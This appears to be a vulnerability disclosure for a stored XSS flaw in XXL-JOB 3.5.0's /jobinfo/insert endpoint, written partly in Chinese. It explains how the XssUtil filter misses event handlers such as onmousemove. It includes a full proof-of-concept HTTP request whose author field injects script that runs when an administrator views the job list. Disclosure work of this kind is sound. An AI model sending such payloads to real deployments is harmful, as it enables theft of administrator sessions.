# In the XXL-JOB 3.5.0 version, the '/jobinfo/insert' interface has an XSS vulnerability. A normal user can construct a string containing malicious JavaScript code in the name and author parameters. When the administrator views the task management interface, these codes will be executed, potentially leading to the theft of sensitive information (such as cookies).



![image-20260715233455491](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715233455491.png)

首先创建一个普通用户账号，勾选通用执行器Sample(xxl-job-executor-sample)、AI执行器Sample(xxl-job-executor-sample-ai)选项

登录普通用户账号，新增

`XssUtil`虽然进行了XSS过滤，但未对`oncopy`、`onmousemove`等事件处理器进行正则匹配，导致触发XSS漏洞。

![image-20260715234747279](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)

`author` 参数存在XSS漏洞

![image-20260716000749222](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)

insert路径

![image-20260715235633636](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715235705809.png)

xxljobinfo类中的参数

![image-20260715235705809](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716000749222.png)



```
POST /jobinfo/insert HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 532
Origin: http://127.0.0.1:8080
Sec-GPC: 1
Connection: keep-alive
Referer: http://127.0.0.1:8080/jobinfo?jobGroup=1
Cookie: xxl_job_login_token=eyJ1c2VySWQiOiIxIiwiZXhwaXJlVGltZSI6MCwic2lnbmF0dXJlIjoiZWI5NjliOTY5ODZlNDJhZmE2OGRlZDhiZjk5NWM3OWIifQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

jobGroup=1&name=qqqq&author=%3Ca+onmousemove%3Dalert(%22xss%22)%3Exss&alarmEmail=&scheduleType=CRON&scheduleConf=0%2F1+*+*+*+*+%3F&cronGen_display=0%2F1+*+*+*+*+%3F&second=3&schedule_conf_CRON=0%2F1+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&glueType=BEAN&executorHandler=a1111&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueRemark=GLUE%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B%E5%8C%96&glueSource=
```

![image-20260716001005267](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716001005267.png)

当管理员查看任务管理时，可被触发

![image-20260716001103740](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716001103740.png)

The malicious code is executed successfully.
